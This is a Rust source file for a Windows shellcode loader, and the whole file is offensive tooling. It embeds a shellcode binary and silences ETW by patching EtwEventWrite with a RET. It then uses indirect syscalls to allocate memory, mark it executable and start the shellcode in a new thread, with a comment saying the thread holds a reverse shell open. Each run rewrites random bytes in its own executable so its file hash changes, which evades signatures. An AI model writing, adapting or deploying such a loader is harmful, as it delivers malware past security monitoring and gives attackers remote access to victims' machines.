// #![windows_subsystem = "windows"] // enable it for background
mod logger;
use hexspell::pe::PE;
use std::fs;
use getrandom::fill;
use std::env::current_exe;
use std::str::from_utf8;
use std::ffi::c_void;
use windows::Win32::Foundation::HANDLE;
use windows::Wdk::Foundation::OBJECT_ATTRIBUTES;
use dinvoke_rs::data::{
    NtAllocateVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx,
    PVOID, PsAttributeList,
};

#[used]
#[unsafe(link_section = ".counter")]
static COUNTER: [u8; 8] = [0x0; 8];
static SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");

fn fill_random(buf: &mut [u8]) -> Result<(), String> {
    fill(buf).map_err(|e| format!("getrandom: {}", e))
}


// Fill `.counter` with fresh random bytes and swap the binary in place.
// The point is the file hash, not the value: every run rewrites 8 bytes,
// so no two on-disk copies are byte-identical. `self-replace` handles
// the Windows lock on the running executable by swapping after exit.
fn bump_counter() -> Result<(), String> {
    let exe_path = current_exe().map_err(|e| format!("current_exe: {}", e))?;
    let exe_str = exe_path.to_str().ok_or_else(|| "exe path is not valid UTF-8".to_string())?;
    let mut pe = PE::from_file(exe_str).map_err(|e| format!("parse PE: {:?}", e))?;

    let (raw_offset, raw_size) = pe
        .sections
        .iter()
        .find(|s| {
            let name_bytes = s.name.value.0.as_slice();
            from_utf8(name_bytes)
                .unwrap_or("")
                .trim_end_matches('\0') == ".counter"
        })
        .map(|s| {
            (
                s.pointer_to_raw_data.value as usize,
                s.size_of_raw_data.value as usize,
            )
        })
        .ok_or_else(|| ".counter section not found".to_string())?;

    if raw_size < 8 {
        return Err(format!(".counter too small ({} bytes)", raw_size));
    }

    let end = raw_offset.checked_add(8).ok_or_else(|| ".counter offset overflow".to_string())?;
    if end > pe.buffer.len() {
        return Err(format!(
            ".counter offset 0x{:X}+8 exceeds file size 0x{:X}",
            raw_offset,
            pe.buffer.len()
        ));
    }

    let mut random_bytes = [0u8; 8];
    fill_random(&mut random_bytes)?;
    pe.buffer[raw_offset..end].copy_from_slice(&random_bytes);

    // Write to a temp file, then swap it in with self-replace.
    let tmp_path = exe_path.with_extension("new");
    let tmp_str = tmp_path.to_str().ok_or_else(|| "tmp path is not valid UTF-8".to_string())?;
    pe.write_file(tmp_str).map_err(|e| format!("write_file: {:?}", e))?;

    self_replace::self_replace(&tmp_path).map_err(|e| format!("self_replace: {:?}", e))?;
    let _ = fs::remove_file(&tmp_path).map_err(|e| format!("cannot delete the tmp file {:?}" , e))?;

    Ok(())
}


/// Patches EtwEventWrite in ntdll.dll with a single RET instruction.
/// All user-mode ETW providers in this process are silenced.
fn patch_etw() -> Result<(), String> {
    unsafe {
        let ntdll = dinvoke_rs::dinvoke::load_library_a("ntdll.dll");
        if ntdll == 0 {
            return Err("ntdll.dll not found".to_string());
        }

        let etw_write = dinvoke_rs::dinvoke::get_function_address(ntdll, "EtwEventWrite");
        if etw_write == 0 {
            return Err("EtwEventWrite not found".to_string());
        }

        // Resolve NtProtectVirtualMemory to change page protection
        let process_handle: HANDLE = HANDLE { 0: -1isize as _ };
        let mut protect_base: *mut c_void = etw_write as *mut c_void;
        let mut protect_size: usize = 1;
        let mut old_protect: u32 = 0;

        let function_type: dinvoke_rs::data::NtProtectVirtualMemory;
        let mut ret: Option<i32>;

        dinvoke_rs::dinvoke::execute_syscall!(
            "NtProtectVirtualMemory",
            function_type,
            ret,
            process_handle,
            &mut protect_base,
            &mut protect_size,
            0x04, // PAGE_READWRITE
            &mut old_protect
        );

        if ret.unwrap_or(-1) != 0 {
            return Err("NtProtectVirtualMemory failed".to_string());
        }

        // Write RET (0xC3) at EtwEventWrite[0]
        let ret_byte: u8 = 0xC3;
        std::ptr::write_volatile(etw_write as *mut u8, ret_byte);

        // Restore original protection
        let mut restore_base: *mut c_void = etw_write as *mut c_void;
        let mut restore_size: usize = 1;
        let mut dummy: u32 = 0;

        let function_type_restore: dinvoke_rs::data::NtProtectVirtualMemory;
        let mut ret_restore: Option<i32>;

        dinvoke_rs::dinvoke::execute_syscall!(
            "NtProtectVirtualMemory",
            function_type_restore,
            ret_restore,
            process_handle,
            &mut restore_base,
            &mut restore_size,
            old_protect,
            &mut dummy
        );

        if ret_restore.unwrap_or(-1) != 0 {
            return Err("NtProtectVirtualMemory (restore) failed".to_string());
        }

        Ok(())
    }
}

fn execute_shellcode() -> Result<(), String> {
    unsafe {
        // Silence user-mode ETW first.
        patch_etw()?;
        let shellcode_vec = SHELLCODE.to_vec();
        let shellcode_size = shellcode_vec.len();

        // NT constants
        const MEM_COMMIT: u32 = 0x1000;
        const MEM_RESERVE: u32 = 0x2000;
        const PAGE_READWRITE: u32 = 0x04;
        const PAGE_EXECUTE_READ: u32 = 0x20;
        const THREAD_ALL_ACCESS: u32 = 0x1FFFFF;
        const INFINITE: u32 = 0xFFFFFFFF;

        // Current process pseudo-handle
        let process_handle: HANDLE = HANDLE { 0: -1isize as _ };

        // ------------------------------------------------------------------
        // 1. NtAllocateVirtualMemory (indirect syscall)
        // ------------------------------------------------------------------
        let mut base_address: PVOID = std::ptr::null_mut();
        let mut region_size: usize = shellcode_size;

        let function_type_alloc: NtAllocateVirtualMemory;
        let mut ret_alloc: Option<i32>;

        dinvoke_rs::dinvoke::execute_syscall!(
            "NtAllocateVirtualMemory",
            function_type_alloc,
            ret_alloc,
            process_handle,
            &mut base_address,
            0usize,
            &mut region_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        if ret_alloc.unwrap_or(-1) != 0 || base_address.is_null() {
            return Err(format!(
                "NtAllocateVirtualMemory failed: 0x{:X}",
                ret_alloc.unwrap_or(-1) as u32
            ));
        }

        // ------------------------------------------------------------------
        // 2. Copy shellcode into the allocated memory
        // ------------------------------------------------------------------
        std::ptr::copy_nonoverlapping(
            shellcode_vec.as_ptr(),
            base_address as *mut u8,
            shellcode_size,
        );

        // ------------------------------------------------------------------
        // 3. NtProtectVirtualMemory (indirect syscall) — flip to RX
        // ------------------------------------------------------------------
        let mut protect_base: PVOID = base_address;
        let mut protect_size: usize = shellcode_size;
        let mut old_protect: u32 = 0;

        let function_type_protect: NtProtectVirtualMemory;
        let mut ret_protect: Option<i32>;

        dinvoke_rs::dinvoke::execute_syscall!(
            "NtProtectVirtualMemory",
            function_type_protect,
            ret_protect,
            process_handle,
            &mut protect_base,
            &mut protect_size,
            PAGE_EXECUTE_READ,
            &mut old_protect
        );

        if ret_protect.unwrap_or(-1) != 0 {
            return Err(format!(
                "NtProtectVirtualMemory failed: 0x{:X}",
                ret_protect.unwrap_or(-1) as u32
            ));
        }

        // ------------------------------------------------------------------
        // 4. NtCreateThreadEx (indirect syscall) — execute the shellcode
        // ------------------------------------------------------------------
        let mut thread_handle: HANDLE = HANDLE::default();
        let attributes: *mut OBJECT_ATTRIBUTES = std::ptr::null_mut();
        let buffer: *mut PsAttributeList = std::ptr::null_mut();

        let function_type_thread: NtCreateThreadEx;
        let mut ret_thread: Option<i32>;

        dinvoke_rs::dinvoke::execute_syscall!(
            "NtCreateThreadEx",
            function_type_thread,
            ret_thread,
            &mut thread_handle,          // *mut HANDLE
            THREAD_ALL_ACCESS,           // ACCESS_MASK
            attributes,                  // *mut OBJECT_ATTRIBUTES
            process_handle,              // HANDLE
            base_address,                // PVOID (StartRoutine)
            std::ptr::null_mut(),        // PVOID (Argument)
            0u32,                        // CreateFlags
            0usize,                      // ZeroBits
            0usize,                      // StackSize
            0usize,                      // MaximumStackSize
            buffer                       // *mut PsAttributeList
        );

        if ret_thread.unwrap_or(-1) != 0 || thread_handle.0 == std::ptr::null_mut() {
            return Err(format!(
                "NtCreateThreadEx failed: 0x{:X}",
                ret_thread.unwrap_or(-1) as u32
            ));
        }

        // ------------------------------------------------------------------
        // 5. Keep the process alive for the shellcode's lifetime.
        //    Waits until the shellcode thread exits (session end, crash,
        //    or explicit ExitThread). No fixed timeout — the reverse shell
        //    stays connected as long as it needs to.
        // ------------------------------------------------------------------
        let kernel32 = dinvoke_rs::dinvoke::get_module_base_address("kernel32.dll");
        if kernel32 == 0 {
            return Err("kernel32 not found".to_string());
        }

        let wait_for_single_object: unsafe extern "system" fn(
            HANDLE, // hHandle
            u32,    // dwMilliseconds
        ) -> u32 = std::mem::transmute(
            dinvoke_rs::dinvoke::get_function_address(kernel32, "WaitForSingleObject"),
        );

        wait_for_single_object(thread_handle, INFINITE);

        Ok(())
    }
}

fn main() {
    match bump_counter() {
        Ok(()) => {
            logger::log_info("Polymorphic signature updated successfully");
        }
        Err(e) => {
            #[cfg(debug_assertions)]
            logger::log_error(&format!("Polymorphic signature updated failed: {:?}", e));
        }
    }

    match execute_shellcode() {
        Ok(()) => {
            logger::log_ok("Shellcode executed successfully");
        }
        Err(e) => {
            #[cfg(debug_assertions)]
            logger::log_error(&format!("Shellcode failed to execute: {:?}", e));
        }
    }
}